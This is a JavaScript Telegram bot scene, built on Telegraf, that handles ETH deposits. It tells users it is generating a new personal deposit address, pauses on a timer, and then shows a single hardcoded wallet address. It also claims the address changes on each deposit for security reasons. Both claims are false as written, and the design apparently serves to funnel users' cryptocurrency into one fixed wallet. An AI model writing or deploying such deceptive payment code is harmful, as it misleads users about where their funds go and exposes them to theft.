const Scene = require('telegraf/scenes/base');
const Markup = require('telegraf/markup');
const scene = new Scene('deposit');

const CANCEL_TEXT = 'Close';

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

scene.enter(async ctx => {
  console.log('deposit scene', ctx.from.id);
  ctx.replyWithHTML(
    'Please wait while we generate a new personal deposit address. Only send <b>ETH</b> too this address or your coins will be lost.',
    Markup.keyboard([[CANCEL_TEXT]])
      .resize()
      .extra()
  );
  await delay(500);
  ctx.replyWithHTML('<b>0x706dC2F9bECDfcAbAbAF1b7249365c17CD732EbD</b>');
  await delay(500);
  ctx.reply('This address will change on each deposit because of security reasons.');
  await delay(500);
  ctx.replyWithHTML('Please only send from an ethereum wallet, see https://ethereum.org for extra instructions.');
});

scene.hears(CANCEL_TEXT, ctx => ctx.scene.enter('welcome'));

scene.leave(ctx => {});

module.exports = scene;
